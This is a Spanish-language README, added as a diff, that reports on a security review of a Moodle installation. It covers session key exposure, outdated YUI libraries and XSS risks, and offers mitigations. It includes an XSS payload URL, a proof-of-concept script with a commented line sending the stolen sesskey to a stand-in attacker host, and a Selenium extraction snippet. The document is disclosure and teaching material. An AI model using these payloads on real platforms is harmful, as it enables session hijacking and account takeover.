@@ -1,0 +1,165 @@
+# 🔍 Análisis de Seguridad: Vulnerabilidades en Plataforma Moodle (Institucion)
+
+Este repositorio documenta un análisis de seguridad realizado sobre un fragmento de código HTML/JavaScript extraído del lado del cliente de una plataforma Moodle institucional. El objetivo es identificar riesgos de seguridad y exposición de datos que podrían comprometer la integridad del sistema y la privacidad de los usuarios.
+
+---
+
+## 📋 Resumen Ejecutivo
+
+Se identificaron **vulnerabilidades críticas** en la implementación de Moodle, principalmente relacionadas con:
+
+- **Exposición de información sensible** en el objeto `M.cfg`
+- **Uso de librerías obsoletas** (YUI 2.9.0 y 3.18.1) con vulnerabilidades conocidas
+- **Riesgos potenciales de Cross-Site Scripting (XSS)**
+- **Falta de cabeceras de seguridad modernas**
+
+---
+
+## 🚨 Vulnerabilidades Detectadas
+
+### 1. **Exposición de Información Sensible (Information Disclosure)**
+**Objeto `M.cfg` expuesto globalmente:**
+```javascript
+M.cfg = {
+    userId: ******,                    // ID único de usuario en BD
+    sesskey: "******",           // Token de sesión crítico
+    // ... otros metadatos
+};
+```
+
+**Riesgos:**
+- ✅ **`userId`**: Expone identificador único del usuario en base de datos
+- 🔴 **`sesskey`**: Token que valida peticiones de escritura. Si es robado mediante XSS, un atacante puede:
+  - Cambiar contraseñas
+  - Matricularse/desmatricularse de cursos
+  - Realizar acciones en nombre del usuario
+
+### 2. **Uso de Librerías Obsoletas (YUI)**
+**Versiones detectadas:**
+- `YUI 3.18.1` (2014 - Descontinuado)
+- `YUI 2.9.0` (2010 - Descontinuado)
+
+**Vulnerabilidades Críticas en YUI 2.9.0:**
+| CVE | Componente | Riesgo | Impacto |
+|-----|------------|---------|----------|
+| CVE-2012-5881 | `uploader.swf` | XSS via Flash | Alto |
+| CVE-2012-5882 | `charts.swf` | XSS via Flash | Alto |
+| CVE-2012-5883 | `swfstore.swf` | XSS via Flash | Alto |
+| CVE-2013-6780 | Uploader | XSS via `allowedDomain` | Alto |
+| CVE-2010-4710 | Widget de Menú | XSS en `addItem` | Medio |
+
+**Ejemplo de ataque:**
+```
+uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert(1)}//
+```
+
+### 3. **Riesgo de Cross-Site Scripting (XSS)**
+**Vectores identificados:**
+- Carga dinámica de módulos via `yui_combo.php` (sin sanitización adecuada)
+- Posible inyección de scripts maliciosos a través de parámetros URL
+- Arquitectura que facilita la ejecución de código no confiable
+
+### 4. **Problemas de Configuración de Seguridad**
+- ❌ **Falta de CSP (Content Security Policy)**
+- ⚠️ **Configuraciones CORS potencialmente débiles**
+- 🔍 **Enumeración de estructura del servidor:**
+  - Tema: `moove`
+  - Rutas expuestas: `/lib/yuilib/`, `/pluginfile.php/`
+  - Archivos PHP dinámicos: `styles.php`, `yui_combo.php`
+
+---
+
+## 🛠️ Pruebas de Concepto (PoC)
+
+### Extracción de Información Sensible
+```javascript
+// Script para demostrar exposición de datos
+(function() {
+    var info = "User ID: " + M.cfg.userId + "\nSessKey: " + M.cfg.sesskey;
+    alert("Información capturada:\n" + info);
+    // En un ataque real, se enviaría a servidor remoto:
+    // fetch('https://atacante.com/steal?data=' + btoa(info));
+})();
+```
+
+### Automatización con Herramientas
+**Python + Selenium:**
+```python
+from selenium import webdriver
+
+driver = webdriver.Chrome()
+driver.get("URL_PLATAFORMA")
+config = driver.execute_script("return M.cfg;")
+print(f"SessKey: {config['sesskey']}")
+print(f"UserID: {config['userId']}")
+```
+
+**Burp Suite:**
+1. Proxy → HTTP History
+2. Buscar respuesta HTML principal
+3. Ctrl+F para localizar `M.cfg`
+
+---
+
+## 📊 Impacto de Seguridad
+
+### Nivel de Riesgo: **ALTO**
+
+**Consecuencias potenciales:**
+1. **Secuestro de Sesión**: Robo de `sesskey` → Acceso completo a la cuenta
+2. **Elevación de Privilegios**: Ejecución de acciones administrativas
+3. **Phishing Interno**: Inyección de formularios falsos
+4. **Exfiltración de Datos**: Extracción de información sensible
+5. **Compromiso de Integridad**: Modificación no autorizada de contenidos
+
+---
+
+## 🛡️ Recomendaciones de Mitigación
+
+### Inmediatas (Críticas):
+1. **Actualizar/Reemplazar YUI**
+   - Eliminar dependencia de YUI 2.9.0 completamente
+   - Migrar a librerías modernas (React, Vue, o YUI versión segura)
+   - Remover archivos `.swf` del servidor
+
+2. **Proteger `M.cfg`**
+   - No exponer `sesskey` en código cliente
+   - Implementar tokens de un solo uso
+   - Usar HttpOnly cookies para datos sensibles
+
+3. **Implementar CSP**
+   ```http
+   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
+   ```
+
+### Mediano Plazo:
+4. **Configurar CORS Estricto**
+5. **Sanitización de Parámetros URL** en `yui_combo.php`
+6. **Obfuscación de Estructura** del servidor
+7. **Monitoreo Continuo** con herramientas como:
+   - Snyk
+   - Nessus
+   - OWASP ZAP
+
+---
+
+## 🔗 Recursos de Referencia
+
+- [Moodle Security Guidelines](https://docs.moodle.org/dev/Security)
+- [YUI End-of-Life Announcement](https://yahooeng.tumblr.com/post/96098168666/important-announcement-regarding-yui)
+- [CVE Details for YUI](https://www.cvedetails.com/vulnerability-list/vendor_id-3/Yahoo.html)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+
+---
+
+## 📝 Notas Finales
+
+Este análisis demuestra cómo la **exposición de información aparentemente inocua** combinada con **dependencias obsoletas** puede crear vectores de ataque críticos. La seguridad en plataformas educativas es particularmente sensible debido a la cantidad de datos personales y académicos manejados.
+
+**⚠️ Advertencia:** Este documento es para fines educativos y de concienciación en seguridad. No utilice estas técnicas en sistemas sin autorización explícita.
+
+---
+**🔐 Seguridad Responsable | 🧠 Conocimiento Compartido | 🛡️ Protección Colectiva**
+
+*Última actualización: Abril 2024*  
+*Tags: #Ciberseguridad #Moodle #XSS #YUI #InformationDisclosure #Pentesting*
